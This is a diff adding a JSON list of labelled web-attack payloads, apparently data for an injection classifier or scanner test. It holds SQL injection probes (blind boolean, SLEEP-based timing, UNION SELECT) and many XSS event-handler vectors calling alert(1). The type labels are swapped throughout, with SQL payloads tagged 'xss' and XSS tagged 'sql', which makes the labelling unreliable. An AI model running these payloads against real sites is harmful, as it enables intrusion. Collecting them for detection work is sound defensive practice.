@@ -1,0 +1,342 @@
+[
+  {
+    "type": "xss",
+    "txt": "AND 1083=1083 AND (1427=1427"
+  },
+  {
+    "type": "xss",
+    "txt": "AND 7506=9091 AND (5913=5913"
+  },
+  {
+    "type": "xss",
+    "txt": "AND 1083=1083 AND ('1427=1427"
+  },
+  {
+    "type": "xss",
+    "txt": "AND 7506=9091 AND ('5913=5913"
+  },
+  {
+    "type": "xss",
+    "txt": "AND 7300=7300 AND 'pKlZ'='pKlZ"
+  },
+  {
+    "type": "xss",
+    "txt": "AND 7300=7300 AND 'pKlZ'='pKlY"
+  },
+  {
+    "type": "xss",
+    "txt": "AND 7300=7300 AND ('pKlZ'='pKlZ"
+  },
+  {
+    "type": "xss",
+    "txt": "AND 7300=7300 AND ('pKlZ'='pKlY"
+  },
+  {
+    "type": "xss",
+    "txt": "AS INJECTX WHERE 1=1 AND 1=1"
+  },
+  {
+    "type": "xss",
+    "txt": "AS INJECTX WHERE 1=1 AND 1=0"
+  },
+  {
+    "type": "xss",
+    "txt": "AS INJECTX WHERE 1=1 AND 1=1#"
+  },
+  {
+    "type": "xss",
+    "txt": "AS INJECTX WHERE 1=1 AND 1=0#"
+  },
+  {
+    "type": "xss",
+    "txt": "AS INJECTX WHERE 1=1 AND 1=1--"
+  },
+  {
+    "type": "xss",
+    "txt": "AS INJECTX WHERE 1=1 AND 1=0--"
+  },
+  {
+    "type": "xss",
+    "txt": "AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe"
+  },
+  {
+    "type": "xss",
+    "txt": "AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='"
+  },
+  {
+    "type": "xss",
+    "txt": "AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)"
+  },
+  {
+    "type": "xss",
+    "txt": "AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--"
+  },
+  {
+    "type": "xss",
+    "txt": "AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#"
+  },
+  {
+    "type": "xss",
+    "txt": "(SELECT * FROM (SELECT(SLEEP(5)))ecMj)"
+  },
+  {
+    "type": "xss",
+    "txt": "(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#"
+  },
+  {
+    "type": "xss",
+    "txt": "(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--"
+  },
+  {
+    "type": "xss",
+    "txt": "ORDER BY 1,SLEEP(5)"
+  },
+  {
+    "type": "xss",
+    "txt": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))"
+  },
+  {
+    "type": "xss",
+    "txt": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4"
+  },
+  {
+    "type": "xss",
+    "txt": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5"
+  },
+  {
+    "type": "xss",
+    "txt": "UNION ALL SELECT 1#"
+  },
+  {
+    "type": "xss",
+    "txt": "UNION ALL SELECT 1,2#"
+  },
+  {
+    "type": "xss",
+    "txt": "UNION ALL SELECT 1,2,3#"
+  },
+  {
+    "type": "xss",
+    "txt": "UNION ALL SELECT 1,2,3,4#"
+  },
+  {
+    "type": "xss",
+    "txt": "UNION ALL SELECT 1,2,3,4,5#"
+  },
+  {
+    "type": "xss",
+    "txt": "UNION ALL SELECT 1,2,3,4,5,6#"
+  },
+  {
+    "type": "xss",
+    "txt": "UNION ALL SELECT USER()--"
+  },
+  {
+    "type": "xss",
+    "txt": "UNION ALL SELECT SLEEP(5)--"
+  },
+  {
+    "type": "xss",
+    "txt": "UNION ALL SELECT USER(),SLEEP(5)-"
+  },
+  {
+    "type": "sql",
+    "txt": "<style>@keyframes slidein {}</style><header style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></header>"
+  },
+  {
+    "type": "sql",
+    "txt": "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><datalist id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></datalist>"
+  },
+  {
+    "type": "sql",
+    "txt": "<style>@keyframes slidein {}</style><html style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></html>"
+  },
+  {
+    "type": "sql",
+    "txt": "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><meter id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></meter>"
+  },
+  {
+    "type": "sql",
+    "txt": "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><base id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></base>"
+  },
+  {
+    "type": "sql",
+    "txt": "<svg><template onload=alert(1)></template>"
+  },
+  {
+    "type": "sql",
+    "txt": "<textarea draggable=\"true\" ondragend=\"alert(1)\">test</textarea>"
+  },
+  {
+    "type": "sql",
+    "txt": "<div draggable=\"true\" ondragenter=\"alert(1)\">test</div>"
+  },
+  {
+    "type": "sql",
+    "txt": "<spacer draggable=\"true\" ondragend=\"alert(1)\">test</spacer>"
+  },
+  {
+    "type": "sql",
+    "txt": "<blockquote oncut=\"alert(1)\" contenteditable>test</blockquote>"
+  },
+  {
+    "type": "sql",
+    "txt": "<a onmouseover=\"alert(1)\">test</a>"
+  },
+  {
+    "type": "sql",
+    "txt": "<noframes ondblclick=\"alert(1)\">test</noframes>"
+  },
+  {
+    "type": "sql",
+    "txt": "<menu id=x tabindex=1 onbeforeactivate=alert(1)></menu>"
+  },
+  {
+    "type": "sql",
+    "txt": "<dd id=x tabindex=1 onbeforedeactivate=alert(1)></dd><input autofocus>"
+  },
+  {
+    "type": "sql",
+    "txt": "<rtc oncopy=\"alert(1)\" contenteditable>test</rtc>"
+  },
+  {
+    "type": "sql",
+    "txt": "<div draggable=\"true\" contenteditable>drag me</div><acronym ondragover=alert(1) contenteditable>drop here</acronym>"
+  },
+  {
+    "type": "sql",
+    "txt": "<element onpaste=\"alert(1)\" contenteditable>test</element>"
+  },
+  {
+    "type": "sql",
+    "txt": "<textarea onchange=alert(1)>XSS</textarea>"
+  },
+  {
+    "type": "sql",
+    "txt": "<datalist onfocusout=alert(1) tabindex=1 id=x></datalist><input autofocus>"
+  },
+  {
+    "type": "sql",
+    "txt": "<bgsound id=x tabindex=1 onactivate=alert(1)></bgsound>"
+  },
+  {
+    "type": "sql",
+    "txt": "<base onmouseleave=\"alert(1)\">test</base>"
+  },
+  {
+    "type": "sql",
+    "txt": "<big onmouseenter=\"alert(1)\">test</big>"
+  },
+  {
+    "type": "sql",
+    "txt": "<br id=x tabindex=1 onfocus=alert(1)></br>"
+  },
+  {
+    "type": "sql",
+    "txt": "<audio oncontextmenu=\"alert(1)\">test</audio>"
+  },
+  {
+    "type": "sql",
+    "txt": "<style>:target {transform: rotate(180deg);}</style><ol id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></ol>"
+  },
+  {
+    "type": "sql",
+    "txt": "<textarea onmousemove=\"alert(1)\">test</textarea>"
+  },
+  {
+    "type": "sql",
+    "txt": "<em onbeforecopy=\"alert(1)\" contenteditable>test</em>"
+  },
+  {
+    "type": "sql",
+    "txt": "<stylesheet xmlns=\"http://www.w3.org/TR/WD-xsl\">"
+  },
+  {
+    "type": "sql",
+    "txt": "<style>@keyframes slidein {}</style><acronym style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></acronym>"
+  },
+  {
+    "type": "sql",
+    "txt": "<datalist id=x tabindex=1 onfocusin=alert(1)></datalist>"
+  },
+  {
+    "type": "sql",
+    "txt": "<style>:target {color:red;}</style><b id=x style=\"transition:color 1s\" ontransitionend=alert(1)></b>"
+  },
+  {
+    "type": "sql",
+    "txt": "<div id=\"42\"><head><base href=\"javascript://\"/></head><body><a href=\"/. /,alert(42)//#\">XXX</a></body>//[\"'`-->]]>]</div>"
+  },
+  {
+    "type": "sql",
+    "txt": "<style>:target {transform: rotate(180deg);}</style><dd id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></dd>"
+  },
+  {
+    "type": "sql",
+    "txt": "<samp draggable=\"true\" ondragenter=\"alert(1)\">test</samp>"
+  },
+  {
+    "type": "sql",
+    "txt": "<dfn onkeyup=\"alert(1)\" contenteditable>test</dfn>"
+  },
+  {
+    "type": "sql",
+    "txt": "<svg><var onload=alert(1)></var>"
+  },
+  {
+    "type": "sql",
+    "txt": "<main id=x tabindex=1 onbeforeactivate=alert(1)></main>"
+  },
+  {
+    "type": "sql",
+    "txt": "<video onloadstart=alert(1)><source>"
+  },
+  {
+    "type": "sql",
+    "txt": "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><source id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></source>"
+  },
+  {
+    "type": "sql",
+    "txt": "<keygen ondblclick=\"alert(1)\">test</keygen>"
+  },
+  {
+    "type": "sql",
+    "txt": "<style>:target {transform: rotate(180deg);}</style><cite id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></cite>"
+  },
+  {
+    "type": "sql",
+    "txt": "<svg onkeydown=\"alert(1)\" contenteditable>test</svg>"
+  },
+  {
+    "type": "sql",
+    "txt": "<form id=x tabindex=1 onbeforedeactivate=alert(1)></form><input autofocus>"
+  },
+  {
+    "type": "sql",
+    "txt": "<footer ondblclick=\"alert(1)\">test</footer>"
+  },
+  {
+    "type": "sql",
+    "txt": "<main oncopy=\"alert(1)\" contenteditable>test</main>"
+  },
+  {
+    "type": "sql",
+    "txt": "<slot onmouseover=\"alert(1)\">test</slot>"
+  },
+  {
+    "type": "sql",
+    "txt": "<multicol onmousedown=\"alert(1)\">test</multicol>"
+  },
+  {
+    "type": "sql",
+    "txt": "<rp onkeyup=\"alert(1)\" contenteditable>test</rp>"
+  },
+  {
+    "type": "sql",
+    "txt": "<dialog ondblclick=\"alert(1)\">test</dialog>"
+  },
+  {
+    "type": "sql",
+    "txt": "<time onpaste=\"alert(1)\" contenteditable>test</time>"
+  }
+]
